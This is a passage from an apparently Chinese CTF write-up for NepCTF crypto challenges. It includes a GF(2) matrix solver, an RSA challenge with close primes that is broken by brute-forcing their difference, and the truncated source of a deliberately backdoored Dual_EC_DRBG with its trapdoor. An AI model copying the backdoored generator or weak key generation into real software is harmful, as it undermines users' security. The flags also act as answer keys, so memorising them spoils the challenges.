class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line">P = [</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">19</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">29</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">28</span>, <span class="number">29</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">28</span>],</span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">27</span>],</span><br><span class="line">[<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">16</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">26</span>, <span class="number">30</span>]]</span><br><span class="line"></span><br><span class="line">PP = zero_matrix(GF(<span class="number">2</span>),<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    PP[k] = [<span class="number">1</span> <span class="keyword">if</span> x <span class="keyword">in</span> P[k] <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">PPt = PP.transpose()</span><br><span class="line"></span><br><span class="line">c = <span class="string">&#x27;0111110000100101000001101011110111101100000010110011101111000101111110111111100100100010001011000101000110110011111101000001001000000101111000001110001111001001100100111000011011101111111101001011100000100100110011111101100111001100111111110001111011101100&#x27;</span></span><br><span class="line">C = zero_matrix(GF(<span class="number">2</span>),<span class="number">8</span>,<span class="number">32</span>)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(c),<span class="number">32</span>):</span><br><span class="line">    C[k//<span class="number">32</span>] = [<span class="number">1</span> <span class="keyword">if</span> x == <span class="string">&#x27;1&#x27;</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> c[k:k+<span class="number">32</span>]]</span><br><span class="line"><span class="built_in">print</span>(C)</span><br><span class="line"></span><br><span class="line">f0 = vector(GF(<span class="number">2</span>),<span class="built_in">list</span>(<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">b&#x27;flag&#x27;</span>.<span class="built_in">hex</span>(),<span class="number">16</span>))[<span class="number">2</span>:].zfill(<span class="number">4</span>*<span class="number">8</span>)))</span><br><span class="line">flag = <span class="string">b&#x27;flag&#x27;</span></span><br><span class="line">tmp = C[<span class="number">0</span>] - (f0*(PPt^<span class="number">6</span>))</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    l = <span class="built_in">list</span>((C[k]-tmp)*PPt^(-<span class="number">6</span>))</span><br><span class="line">    flag += <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> l]),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;P_has_no_Semantic_Security&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="中学数学"><a href="#中学数学" class="headerlink" title="中学数学"></a>中学数学</h3><blockquote><p>本题flag格式: flag{xxx}</p><p>Zuni: 听说密码学是小学数学来着？</p><p>// 随缘评：真的吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">q=next_prime(p+(p&gt;&gt;<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">c=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= 13776679754786305830793674359562910178503525293501875259698297791987196248336062506951151345232816992904634767521007443634017633687862289928715870204388479258679577315915061740028494078672493226329115247979108035669870651598111762906959057540508657823948600824548819666985698501483261504641066030188603032714383272686110228221709062681957025702835354151145335986966796484545336983392388743498515384930244837403932600464428196236533563039992819408281355416477094656741439388971695931526610641826910750926961557362454734732247864647404836037293509009829775634926600458845832805085222154851310850740227722601054242115507</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">c= 6253975396639688013947622483271226838902346034187241970785550830715516801386404802832796746428068354515287579293520381463797045055114065533348514688044281004266071342722261719304097175009672596062130939189624163728328429608123325223000160428261082507446604698345173189268359115612698883860396660563679801383563588818099088505120717238037463747828729693649297904035253985982099474025883550074375828799938384533606092448272306356003096283602697757642323962299153853559914553690456801745940925602411053578841756504799815771173679267389055390097241148454899265156705442028845650177138185876173539754631720573266723359186</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>$p,q$ 接近，且前1024-500位相同，有 $\sqrt{n}&gt;&gt;500 \approx p&gt;&gt;500 \approx q-p$，故可爆破找差值 $k$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">f1, f2</span>):</span><br><span class="line">g = f1.resultant(f2, q)</span><br><span class="line">roots = g.univariate_polynomial().roots()</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(roots) == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">p_ = <span class="built_in">abs</span>(roots[<span class="number">0</span>][<span class="number">0</span>])</span><br><span class="line">q_ = <span class="built_in">abs</span>(roots[<span class="number">1</span>][<span class="number">0</span>])</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">min</span>(p_, q_), <span class="built_in">max</span>(p_, q_))</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">x = <span class="built_in">int</span>(gmpy2.iroot(n,<span class="number">2</span>)[<span class="number">0</span>])</span><br><span class="line">xh = x &gt;&gt; <span class="number">500</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> trange(<span class="number">1000000</span>,<span class="number">10000000</span>):</span><br><span class="line">    d = xh - k</span><br><span class="line">    P.&lt;p, q&gt; = PolynomialRing(ZZ)</span><br><span class="line">    f1 = n - p*q</span><br><span class="line">    f2 = d - (q - p)</span><br><span class="line">    res = solve(f1, f2)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="built_in">print</span>(k)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># 5476332</span></span><br><span class="line"><span class="comment"># (117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171074427891089886767667348073044876487630536209840494632852807000951512126317010773423294553929289375585831391437922887752426888245829185481732564145862194694837, 117374101720892014802773132009595684550070475491812959407700503409964134408139790074777009067182443277766119990724185784535299405313567262727445965171110284932237912222026220958706260216927350725324469350893507592837055161338352274913301924684983498346654165295930055956026431077232360603315231271970883987911)</span></span><br></pre></td></tr></table></figure><p>再常规解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;never_ignore_basic_math&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="bd-key"><a href="#bd-key" class="headerlink" title="bd_key"></a>bd_key</h3><blockquote><p>本题flag格式: NepCTF{xxx}</p><p>master of pwn一下就解出了明文，因为有后门（本题与pwn无关）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long, getPrime</span><br><span class="line"><span class="keyword">from</span> FLAG <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"> Note: I have modified Dual_EC a little bit.</span></span><br><span class="line"><span class="string">    It would be EASIER for you to exploit it.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dual_EC</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, s_0=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getRandomNBitInteger</span><br><span class="line">       </span><br><span class="line">        <span class="comment"># Init curve P-256</span></span><br><span class="line">        self.p = <span class="number">115792089210356248762697446949407573530086143415290314195533631308867097853951</span></span><br><span class="line">        self.n = <span class="number">115792089210356248762697446949407573529996955224135760342422259061068512044369</span></span><br><span class="line">        self.b = <span class="number">0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b</span></span><br><span class="line">        self.curve = EllipticCurve(GF(self.p), [-<span class="number">3</span>, self.b])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init P, Q</span></span><br><span class="line">        self.Qx = <span class="number">0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296</span></span><br><span class="line">        self.Qy = <span class="number">0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5</span></span><br><span class="line">        self.Q = self.curve(self.Qx, self.Qy)</span><br><span class="line">        self.d = getRandomNBitInteger(<span class="number">256</span>)</span><br><span class="line">        self.P = self.d * self.Q      </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Init state, h_adin</span></span><br><span class="line">        <span class="keyword">if</span> s_0 == <span class="literal">None</span>:</span><br><span class="line">            self.s_i = <span class="built_in">int</span>(floor((<span class="number">2</span>^<span class="number">16</span>-<span class="number">1</span>)*random()))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.s_i = s_0</span><br><span class="line">        self.h_adin = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        self.__leak_par()</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__leak_par</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;curve = <span class="subst">&#123;self.curve&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;P = <span class="subst">&#123;self.P&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;d = <span class="subst">&#123;self.d&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Q = <span class="subst">&#123;self.Q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Output 32bytes now.          </span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__Dual_EC_DRBG</span>(<span class="params">self, h_adin = <span class="number">0</span></span>): </span><br><span class="line">        t_i = self.s_i ^^ h_adin</span><br><span class="line">        self.s_i = (t_i*self.P)[<span class="number">0</span>].lift()</span><br><span class="line">        r_i = (self.s_i*self.Q)[<span class="number">0</span>].lift()</span><br><span class="line">        <span class="keyword">return</span> r_i</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">getRandomNBytes</span>(<span class="params">self, N:<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        req = (N/<span class="number">32</span>).ceil()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(req):</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>):</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG(self.h_adin)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = (result &lt;&lt; (<span class="number">32</span>*<span class="number">8</span>)) | self.__Dual_EC_DRBG()</span><br><span class="line"></span><br><span class="line">        self.s_i = (self.s_i * self.P)[<span class="number">0</span>].lift()</span><br><span class="line"></span><br><span class="line">        result = result 